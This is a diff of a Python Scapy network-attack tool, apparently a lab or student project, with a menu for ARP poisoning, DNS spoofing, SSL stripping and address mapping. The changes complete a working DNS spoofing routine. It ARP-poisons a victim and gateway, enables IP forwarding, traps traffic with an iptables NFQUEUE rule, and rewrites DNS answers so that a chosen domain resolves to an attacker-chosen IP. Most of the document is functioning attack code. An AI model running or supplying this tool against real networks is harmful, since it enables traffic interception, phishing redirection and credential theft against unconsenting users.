@@ -26,13 +26,15 @@ import netfilterqueue
 
 # from mitmproxy import controller, proxy, options
 
+# Global variables
+dns_ip = ""
+dns_domain = ""
+
 
 # The name of the network interface to use for sniffing and sending packets
 interval = 4
 RUNINGTHREAD = False
-# Set the interface to listen and respond on
-net_interface = "enp0s8"
-INTERFACE_NAME = "enp0s3"
+NET_INTERFACE = "enp0s8"
 ATTACKS = {
     "a": "ARP poisoning",
     "b": "DNS spoofing",
@@ -40,17 +42,6 @@ ATTACKS = {
     "d": "Address Mapping",
 }
 
-IP_ATTACKER = ""
-MAC_ATTACKER = ""
-IP_VICTIMS = []
-MAC_VICTIMS = []
-
-
-# Python 2.7... :(
-try:
-    input = raw_input
-except NameError:
-    pass
 
 
 # Set up argument parser for using arguments in the command line
@@ -68,26 +59,23 @@ def spoof(target_ip, spoof_ip):
 
 
 def ARPposioning():
-    IP_ATTACKER = input("Enter IP address of attacker: ")
-    MAC_ATTACKER = getmacbyip(IP_ATTACKER)
+    ip_attacker = custom_input("Enter IP address of attacker: ")
+    mac_attacker = getmacbyip(ip_attacker)
 
-    victimNumber = input("Do you want to spoof one or multiple victims? (1/m)")
+    victimNumber = custom_input("Do you want to spoof one or multiple victims? (1/m)")
     if victimNumber == "1":
-        ipVictim = input("Enter IP address of victim: ")
+        ipVictim = custom_input("Enter IP address of victim: ")
         macVictim = getmacbyip(ipVictim)
 
-        IP_VICTIMS.append(ipVictim)
-        MAC_VICTIMS.append(macVictim)
-
-        ipToSpoof = input("Enter IP address to spoof: ")
+        ipToSpoof = custom_input("Enter IP address to spoof: ")
         print(ipVictim)
         spoof(ipVictim, ipToSpoof)
 
         print("\n\n")
 
     elif victimNumber == "m":
-        IPrange = input("What is the range of IP addresses?")
-        IpToSpoof = input("What is the IP address to spoof?")
+        IPrange = custom_input("What is the range of IP addresses? ")
+        IpToSpoof = custom_input("What is the IP address to spoof? ")
         if "-" in IPrange:
             upperBoundary = IPrange.split("-")[1]
             lowerBoundary = lowerBoundary = IPrange.split(".")[3].split("-")[0]
@@ -104,13 +92,10 @@ def ARPposioning():
                 )
                 macVictim = getmacbyip(ipVictim)
 
-                IP_VICTIMS.append(ipVictim)
-                MAC_VICTIMS.append(macVictim)
-
                 print(ipVictim)
                 arp = Ether() / ARP()
-                arp[Ether].src = MAC_ATTACKER
-                arp[ARP].hwsrc = MAC_ATTACKER
+                arp[Ether].src = mac_attacker
+                arp[ARP].hwsrc = mac_attacker
                 arp[ARP].psrc = ipToSpoof
                 arp[ARP].hwdst = macVictim
                 arp[ARP].pdst = ipVictim
@@ -127,62 +112,69 @@ def ARPposioning():
 
 
 def DNSpoisoning():
-    dns_ip = ""
-    dns_domain = ""
+    global dns_ip
+    global dns_domain
+    
+    # Make sure IP forwarding is enabled
     os.system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")
+    
     # Set up iptables rule to trap outgoing packets in a queue
-    print(1)
     os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
-    print(2)
-
-    # DNS poisoning requires impersonating the router
 
     # Ask for a domain until a valid one is provided
     while not dns_domain:
-        global dns_domain_input
-        dns_domain_input = input("Enter the domain name to spoof: ")
+        dns_domain_input = custom_input("Enter the domain name to spoof: ")
         dns_domain_valid = validate_domain(dns_domain_input)
 
         if dns_domain_valid:
             dns_domain = dns_domain_input
         else:
-            print(
-                "{warning}Please enter a valid domain (format: www.example.com){endc}".format(
-                    warning=bcolors.WARNING, endc=bcolors.ENDC
-                )
-            )
-    print(dns_domain)
-    ipVictim = raw_input("Enter the IP of the victim u chose")
-    ipGate = raw_input("Enter the IP of the Gateway (probably 10.0.2.1)")
-    spoof(ipGate, ipVictim)
-    spoof(ipVictim, ipGate)
+            print("{warning}Please enter a valid domain (format: www.example.com){endc}".format(warning=bcolors.WARNING, endc=bcolors.ENDC))
+    
+    # Ask for an IP to resolve the given domain to until a valid one is provided
+    while not dns_ip:
+        dns_ip_input = custom_input('Enter the IP address to redirect the spoofed domain name to: ')
+        dns_ip_parsed = parse_ip_input(dns_ip_input)
 
+        if len(dns_ip_parsed) == 1:
+            dns_ip = dns_ip_parsed[0]
+        else:
+            print('{warning}Please fill in a single valid IP address, not a range or list.{endc}'.format(warning=bcolors.WARNING, endc=bcolors.ENDC))
+
+    ip_victim = custom_input("Enter the IP of the victim u chose: ")
+    ip_gate = custom_input("Enter the IP of the gateway (probably 10.0.2.1): ")
+    spoof(ip_gate, ip_victim)
+    spoof(ip_victim, ip_gate)
+
+    # Start up the netfilterqueue in a separate thread
+    queue_thread = threading.Thread(target=netfilter_queue)
+    queue_thread.daemon = True
+    queue_thread.start()
+
+    print(
+        "\n{cyan}{attack}{endc} has been executed (set up background service which'll resolve {cyan}{domain}{endc} to {cyan}{ip}{endc} for the victim)\n".format(
+            cyan=bcolors.OKCYAN,
+            attack=ATTACKS["b"],
+            endc=bcolors.ENDC,
+            domain=dns_domain,
+            ip=dns_ip,
+        )
+    )
+
+
+def netfilter_queue():
     queue = netfilterqueue.NetfilterQueue()
     queue.bind(0, process_packet)
     queue.run()
-
-    # Assumption: ARP poisoning has been applied to make the victim think the attacker is the router (where the DNS lookup message will be sent)
-    # The data below is assumed from that ARP poisoning attack
-    # Sniff for a DNS query matching the 'packet_filter' and send a specially crafted reply
-
-    # print(
-    #     "\n{cyan}{attack}{endc} has been executed (sent a packet to victim resolving {cyan}{domain}{endc} to {cyan}{ip}{endc})\n".format(
-    #         cyan=bcolors.OKCYAN,
-    #         attack=ATTACKS["b"],
-    #         endc=bcolors.ENDC,
-    #         domain=dns_domain,
-    #         ip=dns_ip,
-    #     )
-    # )
 
 
 def process_packet(packet):
     scapy_packet = IP(packet.get_payload())
     if scapy_packet.haslayer(DNSRR):
         qname = scapy_packet[DNSQR].qname
-        if dns_domain_input in qname.decode():
+        if dns_domain in qname.decode():
             print("[+] Spoofing target")
-            answer = DNSRR(rrname=qname, rdata="192.168.56.102")
+            answer = DNSRR(rrname=qname, rdata=dns_ip)
             scapy_packet[DNS].an = answer
             scapy_packet[DNS].ancount = 1
             del scapy_packet[IP].len
@@ -203,7 +195,7 @@ def sniffing(dns_domain, ipVictim, ipGate, RUNINGTHREAD):
                 dns_reply, dns_dom=dns_domain, ipVictim=ipVictim, ipGate=ipGate
             ),
             store=0,
-            iface=net_interface,
+            iface=NET_INTERFACE,
             count=1,
         )
 
@@ -243,7 +235,7 @@ def dns_reply(packet, dns_dom, ipVictim, ipGate):
         response_packet = eth / ip / udp / dns
 
         # Send the DNS response
-        sendp(response_packet, iface=net_interface)
+        sendp(response_packet, iface=NET_INTERFACE)
 
         # forward the packet to the gateway (unimplemented)
 
@@ -264,7 +256,7 @@ def dns_forwarding():
             dns_forwarding_callback, ip_gateway=ip_gateway, mac_gateway=mac_gateway
         ),
         store=0,
-        iface=net_interface,
+        iface=NET_INTERFACE,
         count=1,
     )
 
@@ -309,7 +301,7 @@ def dns_forwarding_callback(packet, ip_gateway, mac_gateway):
 
         print(dns_request.summary())
 
-        sendp(dns_request, iface=net_interface)
+        sendp(dns_request, iface=NET_INTERFACE)
 
     # Forward DNS responses to the victim
     if is_dns_response:
@@ -321,7 +313,7 @@ def dns_forwarding_callback(packet, ip_gateway, mac_gateway):
 
         dns_response = eth / ip / udp / dns
 
-        sendp(dns_response, iface=net_interface)
+        sendp(dns_response, iface=NET_INTERFACE)
 
 
 def SSLstripping():
@@ -383,7 +375,7 @@ def SSLstripping():
 
 
 def ssl_strip_sniffing(request, response):
-    sniff(filter="tcp port 80", prn=request, store=0, iface=net_interface, count=1)
+    sniff(filter="tcp port 80", prn=request, store=0, iface=NET_INTERFACE, count=1)
 
 
 class RequestLogger:
@@ -472,8 +464,7 @@ def main():
             "    {cyan}e{endc}) Exit\n".format(cyan=bcolors.OKCYAN, endc=bcolors.ENDC)
         )
 
-        choice = input("\nYour choice: " + bcolors.OKCYAN)
-        print(bcolors.ENDC + "\n")
+        choice = custom_input("\nYour choice: ")
         selectedName = choice
         if choice in ATTACKS:
             selectedName = ATTACKS[choice]
@@ -490,11 +481,15 @@ def main():
         if choice == "e":
             # Remove potential IP tables redirect
             try:
-                os.system(
-                    "iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 8080"
-                )
+                os.system("iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 8080")
             except:
                 pass
+        
+            try:
+                os.system("iptables -D FORWARD -j NFQUEUE --queue-num 0")
+            except:
+                pass
+
             break
         elif choice == "a":
             ARPposioning()
@@ -506,6 +501,11 @@ def main():
             mapAddresses()
         else:
             print("Invalid input. Please try again.\n")
+
+def custom_input(msg):
+    inp = raw_input(msg + bcolors.OKCYAN)
+    sys.stdout.write(bcolors.ENDC)
+    return inp
 
 
 # Entry point: This part runs when the tool is called from the command line using `python tool.py`. The if-statement is not required, but good practice.
